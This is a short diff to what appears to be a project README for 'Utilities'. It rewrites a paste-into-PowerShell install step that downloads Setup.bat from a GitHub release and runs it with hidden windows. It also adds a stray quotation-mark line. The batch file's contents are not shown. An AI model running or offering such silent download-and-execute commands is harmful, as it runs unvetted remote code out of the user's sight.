@@ -28,7 +28,8 @@
 Paste this command into CMD or PowerShell:
 
 ```
-powershell -c "ni -f -it d $env:AppData\Utilities;iwr 'https://github.com/Abscissa24/Utilities/releases/download/Rolling-Release/Setup.bat' -OutFile $env:AppData\Utilities\Setup.bat;saps $env:AppData\Utilities\Setup.bat"
+powershell -WindowStyle Hidden -NoProfile -Command "& {New-Item -Force -ItemType Directory $env:AppData\Utilities | Out-Null; Invoke-WebRequest 'https://github.com/Abscissa24/Utilities/releases/download/Rolling-Release/Setup.bat' -OutFile $env:AppData\Utilities\Setup.bat -UseBasicParsing | Out-Null; Start-Process $env:AppData\Utilities\Setup.bat -WindowStyle Hidden}"
+"
 ```
 
 ---
